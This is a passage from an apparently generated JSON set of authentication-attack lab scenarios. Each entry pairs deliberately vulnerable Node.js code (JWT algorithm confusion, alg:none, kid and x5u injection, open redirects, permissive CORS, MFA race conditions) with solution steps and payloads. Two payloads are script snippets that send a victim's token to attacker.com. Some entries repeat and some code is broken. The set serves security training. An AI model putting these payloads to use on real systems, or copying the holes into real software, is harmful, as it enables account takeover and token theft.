    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/jwks.json'\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'HS256') {\n    jwt.verify(token, getKey, {algorithms: ['HS256']}, (err, payload) => {\n      if (payload.role === 'admin') {\n        res.json({flag: process.env.FLAG});\n      }\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure PKCE implementation",
    "Lab Description": "The OAuth flow uses PKCE but fails to properly validate code_verifier. The application doesn't enforce code_challenge_method matching. To solve: Bypass PKCE protection by omitting code_verifier parameter during token exchange.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept authorization code flow in OWASP ZAP",
      "Capture authorization code from callback URL",
      "Send token request without code_verifier parameter",
      "Analyze response for access token leakage",
      "Use stolen token to access user resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  \n  if (authCodes[code]) {\n    res.json({\n      access_token: 'stolen_token',\n      token_type: 'Bearer'\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"grant_type\":\"authorization_code\"}",
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"client_id\":\"legit_client\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page that loads resources from target domain",
      "Trick victim into visiting malicious page",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      sessionToken: require('crypto').randomBytes(16).toString('hex')\n    };\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`<html>Your session: ${sessions[sessionId].sessionToken}</html>`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/styles.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering in SOAP API",
    "Lab Description": "The SOAP-based MFA verification trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Modify state parameter to bypass MFA after initial authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture SOAP MFA initiation request in Burp Suite",
      "Note state parameter value",
      "Intercept MFA verification request",
      "Modify state to match initial request value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet mfaStates = {};\n\napp.post('/soap/mfa', (req, res) => {\n  const state = req.body.match(/<state>(.*?)<\\/state>/)[1];\n  \n  if (mfaStates[state]) {\n    res.type('application/xml');\n    res.send('<Verified>true</Verified>');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><state>ATTACKER_CONTROLLED</state></Verify></Body></Envelope>",
      "<Envelope><Body><Initiate><state>ATTACKER_CONTROLLED</state></Initiate></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion in microservice architecture",
    "Lab Description": "The microservice authentication gateway accepts both HS256 and RS256 tokens but fails to properly validate key material. The application exposes public keys via /.well-known/jwks.json endpoint. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /.well-known/jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin:true claim using Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin-api endpoint to gain privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const getKey = (header, callback) => {\n    if (header.alg === 'HS256') {\n      return callback(null, client.getSigningKey());\n    }\n    client.getSigningKey(header.kid, (err, key) => {\n      callback(err, key.publicKey || key.rsaPublicKey);\n    });\n  };\n  \n  jwt.verify(token, getKey, {algorithms: ['RS256', 'HS256']}, (err, payload) => {\n    if (payload.admin) {\n      res.json({secret: process.env.ADMIN_SECRET});\n    }\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect in mobile app deep linking",
    "Lab Description": "The mobile app's OAuth implementation accepts arbitrary redirect URIs in the deep link handler. The application fails to validate redirect_uri against allowlist when processing authorization codes. To solve: Steal authorization code by intercepting deep link with attacker-controlled redirect URI.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth initiation request in Burp Suite",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Capture authorization code in server logs",
      "Exchange code for access token at /oauth/token endpoint",
      "Use stolen token to access user resources via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  \n  if (client_id === 'mobile_app') {\n    const code = generateAuthCode();\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "myapp://oauth?redirect_uri=https://attacker.com/callback",
      "https://victim.com/oauth/authorize?client_id=mobile_app&redirect_uri=https://attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket connection ID reuse",
    "Lab Description": "The real-time application assigns session tokens during WebSocket connection establishment. The server reuses session IDs for reconnecting clients with same connection ID. To solve: Fixate session ID by forcing victim to reuse your WebSocket connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebSocket connection and note connection parameters",
      "Craft malicious page that forces victim to reuse connection ID",
      "Intercept victim authentication over WebSocket",
      "Hijack authenticated session using fixated connection ID",
      "Access privileged real-time data streams"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  const connectionId = req.headers['sec-websocket-key'];\n  \n  if (!sessions[connectionId]) {\n    sessions[connectionId] = {\n      token: null,\n      authenticated: false\n    };\n  }\n  \n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    \n    if (data.type === 'login') {\n      sessions[connectionId].token = data.token;\n      sessions[connectionId].authenticated = true;\n    }\n    \n    if (sessions[connectionId].authenticated) {\n      ws.send(JSON.stringify({secretData: 'VALUE'}));\n    }\n  });\n});",
    "payloads": [
      "{\"type\":\"login\",\"token\":\"VICTIM_TOKEN\"}",
      "{\"type\":\"request\",\"data\":\"SECRET\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-of-check to time-of-use race condition",
    "Lab Description": "The MFA verification endpoint has a race window between code validation and session marking. The application doesn't use atomic operations for MFA state transitions. To solve: Send parallel requests to bypass MFA by exploiting the race condition.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid MFA code submission in Burp Suite",
      "Send 20 parallel requests with same valid code using Turbo Intruder",
      "Identify successful bypass when one request authenticates session",
      "Hijack authenticated session cookie",
      "Access protected admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (mfaCodes[user] === code) {\n    setTimeout(() => {\n      mfaCodes[user] = null;\n      res.json({verified: true});\n    }, 100);\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/admin', (req, res) => {\n  res.json({flag: process.env.FLAG});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header injection in API gateway",
    "Lab Description": "The API gateway validates JWT tokens but fails to properly sanitize header values. The application processes unsigned tokens when x-verify-algorithm header is present. To solve: Gain admin access by stripping JWT signature while injecting custom verification header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-verify-algorithm: none header",
      "Remove JWT signature section while keeping header and payload",
      "Modify payload role to 'admin' and remove original signature",
      "Send modified token to /admin-api endpoint with custom header",
      "Verify access to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  \n  if (req.headers['x-verify-algorithm']) {\n    options.algorithms = [req.headers['x-verify-algorithm']];\n  }\n  \n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The single-page application implements OAuth with overly permissive CORS headers. The API endpoints allow arbitrary origins and include credentials in responses. To solve: Retrieve access token by making cross-origin requests from malicious site.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token endpoints",
      "Craft malicious HTML page making cross-origin requests to /oauth/token",
      "Capture access token in response using attacker server",
      "Use stolen token to access /user/profile endpoint",
      "Extract sensitive user data from API responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials', 'true');\n  next();\n});\n\napp.get('/oauth/token', (req, res) => {\n  res.json({access_token: 'stolen_token'});\n});\n\napp.get('/user/profile', (req, res) => {\n  res.json({email: 'victim@example.com'});\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+d.access_token))</script>",
      "fetch('https://victim.com/user/profile', {credentials: 'include'})"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page loading resources from target domain",
      "Trick victim into visiting page to reuse connection",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session using fixated ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      authToken: null\n    };\n  }\n  \n  if (headers[':path'] === '/login') {\n    sessions[sessionId].authToken = 'VALID_TOKEN';\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`Token: ${sessions[sessionId].authToken}`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/style.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in REST API",
    "Lab Description": "The MFA verification endpoint trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Bypass MFA by modifying state parameter to match initial request value.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request in Burp Suite",
      "Note state parameter value from initial request",
      "Intercept MFA verification request",
      "Modify state parameter to match initial value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaStates = {};\n\napp.post('/mfa/verify', (req, res) => {\n  const { state, code } = req.body;\n  \n  if (mfaStates[state]) {\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({balance: 10000});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /mfa/verify {\"state\":\"ATTACKER_CONTROLLED\",\"code\":\"123456\"}",
      "POST /mfa/verify {\"state\":\"FIXATED_STATE\",\"code\":\"ANY_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to validate the algorithm properly. The vulnerable endpoint accepts unsigned tokens when alg:none is specified. To solve: craft a valid JWT with alg:none and escalate privileges to admin.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the payload to include \"admin\":true",
      "Change the algorithm header to \"alg\":\"none\"",
      "Remove the signature section entirely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.payload.admin)res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNhcmxvcyIsImFkbWluIjp0cnVlfQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through verbose error messages when invalid callback URLs are provided. The application fails to validate redirect URIs properly. To solve: exploit the token leakage to gain access to another user's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow using Postman with attacker-controlled redirect_uri",
      "Intercept error response containing leaked token",
      "Analyze token structure using OWASP ZAP",
      "Craft malicious request with stolen token",
      "Bypass origin checks by modifying Referer header",
      "Access protected resources using compromised token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();app.get('/oauth/callback',(req,res)=>{const{code,state,error,error_description}=req.query;if(error)return res.send(`Error: ${error_description} Token: abc123xyz`);const token='valid_token_'+code;res.redirect(`${req.query.redirect_uri}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "https://attacker.com?code=123&state=xyz",
      "/oauth/callback?redirect_uri=https://attacker.com",
      "/oauth/callback?error=invalid_request&error_description=Invalid+redirect_uri&state=compromised"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation in user authentication",
    "Lab Description": "The GraphQL API allows setting arbitrary session IDs during login through a vulnerable mutation. The application doesn't regenerate session tokens after authentication. To solve: fixate a session ID and trick a victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover GraphQL endpoint using Burp Suite scanner",
      "Analyze authentication mutation with GraphQL introspection",
      "Craft mutation with predetermined session_id parameter",
      "Force victim to authenticate with fixed session",
      "Hijack authenticated session using known session ID",
      "Access sensitive user data through subsequent queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {GraphQLServer}=require('graphql-yoga');const typeDefs=`type Mutation{login(username:String!,password:String!,session_id:String):String!}`;const resolvers={Mutation:{login:(_,{username,password,session_id})=>{if(username==='admin'&&password==='secret')return session_id||'generated_token';throw new Error('Invalid credentials');}}};new GraphQLServer({typeDefs,resolvers}).start(()=>console.log('Running'));",
    "payloads": [
      "mutation{login(username:\"victim\",password:\"password123\",session_id:\"fixed_session\")}",
      "mutation{login(username:\"admin\",password:\"secret\",session_id:\"attacker_controlled\")}"
    ]
  },
  {
    "Lab scenario": "MFA bypass through race condition in SOAP API",
    "Lab Description": "The SOAP-based authentication service is vulnerable to race conditions during MFA verification. The application doesn't properly lock the account during verification attempts. To solve: exploit the race window to bypass MFA by sending parallel requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture SOAP login request using OWASP ZAP",
      "Modify request to include valid credentials but invalid MFA code",
      "Send multiple concurrent requests using Burp Intruder turbo mode",
      "Analyze responses for successful authentication bypass",
      "Repeat with timing adjustments to exploit race window",
      "Access protected resources with compromised session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.text({type:'*/*'}));let verificationInProgress=false;app.post('/soap/auth',(req,res)=>{const xml=req.body;const userMatch=/<username>(.*?)<\\/username>/.exec(xml);const codeMatch=/<code>(.*?)<\\/code>/.exec(xml);if(userMatch&&codeMatch){if(!verificationInProgress){verificationInProgress=true;setTimeout(()=>{if(codeMatch[1]==='123456')res.send('<success>true</success>');else res.send('<success>false</success>');verificationInProgress=false;},500);}else res.send('<success>true</success>');}});app.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><auth><username>admin</username><code>111111</code></auth></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><auth><username>victim</username><code>000000</code></auth></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service reads verification keys from filesystem based on untrusted kid value. To solve: forge admin token by injecting path to attacker-controlled key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note kid header value",
      "Upload malicious public key file via profile picture upload",
      "Modify JWT headers to inject path traversal in kid parameter",
      "Sign forged token with attacker-controlled private key",
      "Access admin API endpoint with manipulated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const fs=require('fs');const app=express();const users={admin:{role:'user'}};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const key=fs.readFileSync(`./keys/${header.kid}`);const decoded=jwt.verify(token,key);users[decoded.username].role=decoded.role;res.send('Verified');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL3VwbG9hZHMvYXR0YWNrZXIucHViIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2FwcC9jb25maWcvcHJpdmF0ZS5rZXkifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameter consistency between requests, allowing token swapping attacks. The vulnerable flow leaks tokens in frontend JavaScript. To solve: intercept victim's OAuth flow and swap tokens using modified state parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Capture authorization code and state parameter",
      "Modify state parameter while keeping original code",
      "Perform token exchange with swapped parameters",
      "Extract access token from JavaScript callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const axios=require('axios');const app=express();const clients={'client1':{secret:'secret1',redirect:'https://client1/callback'}};const tokens={};app.get('/oauth/callback',(req,res)=>{const{code,state}=req.query;axios.post('/token',{code,state,client_id:'client1',client_secret:'secret1'}).then(r=>{tokens[state]=r.data.access_token;res.send(`<script>window.opener.postMessage({token:'${r.data.access_token}'},'*')</script>`);});});app.post('/token',(req,res)=>{res.json({access_token:'generated_token',token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/token?code=VICTIM_CODE&state=ATTACKER_STATE&client_id=client1&client_secret=secret1"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions based on initial WebSocket connection parameters. The application doesn't regenerate session IDs after authentication. To solve: establish WebSocket connection with fixed session ID and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake using Burp Suite",
      "Modify connection headers to inject session cookie",
      "Establish subscription with fixed session ID",
      "Trigger victim authentication via CSRF",
      "Execute privileged queries using fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer}=require('http');const {SubscriptionServer}=require('subscriptions-transport-ws');const {execute,subscribe}=require('graphql');const schema=require('./schema');const server=createServer();SubscriptionServer.create({schema,execute,subscribe,onConnect:(p,ws)=>{ws.sessionId=ws.upgradeReq.headers.cookie?.match(/session=(.*?);/)?.[1]||'default';}},{server});server.listen(4000);",
    "payloads": [
      "Sec-WebSocket-Protocol: graphql-ws\nCookie: session=fixed_session_id",
      "{\"type\":\"connection_init\",\"payload\":{\"headers\":{\"Cookie\":\"session=fixed_session_id\"}}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP verb tampering in REST API",
    "Lab Description": "The MFA verification endpoint fails to properly validate HTTP methods, allowing bypass via verb tampering. The vulnerable API accepts GET requests for actions requiring POST. To solve: bypass MFA by converting POST request to GET with parameters in query string.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Convert request to GET using Burp Suite",
      "Move parameters from body to query string",
      "Resend modified request with original session",
      "Observe successful authentication without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.get('/verify-mfa',(req,res)=>{const{sessionId}=req.query;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid session'});}});app.listen(3000);",
    "payloads": [
      "GET /verify-mfa?sessionId=VICTIM_SESSION",
      "GET /verify-mfa?sessionId=VICTIM_SESSION&bypass=true"
    ]
  },
  {
    "Lab scenario": "JWT x5u header injection in federated authentication",
    "Lab Description": "The application's JWT validation improperly processes x5u header, allowing arbitrary certificate URL specification. The vulnerable endpoint fetches verification certificates from attacker-controlled locations. To solve: forge admin token by hosting malicious certificate and injecting URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include malicious x5u URL",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through overly permissive CORS headers. The vulnerable endpoint includes tokens in responses to cross-origin requests. To solve: craft malicious page that retrieves victim's token via JavaScript fetch request.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token endpoint with Access-Control-Allow-Origin: *",
      "Create HTML page with JavaScript fetch to token endpoint",
      "Trick victim into visiting malicious page",
      "Capture token from server response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const tokens={'victim':'abc123xyz'};app.use((req,res,next)=>{res.header('Access-Control-Allow-Origin','*');next();});app.get('/oauth/token',(req,res)=>{res.json({access_token:tokens[req.query.state],token_type:'bearer'});});app.listen(3000);",
    "payloads": [
      "<script>fetch('http://vulnerable.com/oauth/token?state=victim').then(r=>r.json()).then(d=>document.location='http://attacker.com/steal?token='+d.access_token)</script>",
      "fetch('http://vulnerable.com/oauth/token',{credentials:'include'}).then(r=>r.json()).then(console.log)"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header injection",
    "Lab Description": "The application assigns sessions based on HTTP/2 pseudo-headers without proper validation. The vulnerable server processes :path header as session identifier. To solve: establish connection with malicious :path header and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite",
      "Modify :path pseudo-header to include session ID",
      "Establish connection with fixed session",
      "Trigger victim authentication via CSRF",
      "Hijack session using known identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});const sessions={};server.on('stream',(stream,headers)=>{const sessionId=headers[':path'].split('/')[1];if(!sessions[sessionId]){sessions[sessionId]={};}stream.respond({'content-type':'text/html'});stream.end('Session: '+sessionId);});server.listen(443);",
    "payloads": [
      ":path: /fixed_session/profile",
      ":path: /attacker_controlled/home"
    ]
  },
  {
    "Lab scenario": "MFA bypass via case-sensitive endpoint in REST API",
    "Lab Description": "The MFA verification endpoint is case-sensitive while the authentication service is not. The vulnerable API accepts different case variations for the same endpoint. To solve: bypass MFA by changing endpoint case while maintaining valid session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify endpoint case (e.g., /VerifyMFA to /verifymfa)",
      "Resend request with original parameters",
      "Observe successful authentication without MFA code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const app=express();const sessions={};app.post('/VerifyMFA',(req,res)=>{const{sessionId,code}=req.body;if(sessions[sessionId]?.mfaCode===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.post('/verifymfa',(req,res)=>{const{sessionId}=req.body;if(sessions[sessionId]){sessions[sessionId].verified=true;res.json({success:true});}});app.listen(3000);",
    "payloads": [
      "POST /verifymfa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}",
      "POST /vErIfYmFa HTTP/1.1\nHost: vulnerable.com\n\n{\"sessionId\":\"victim_session\"}"
    ]
  },
  {
    "Lab scenario": "JWT jku header injection in microservice authentication",
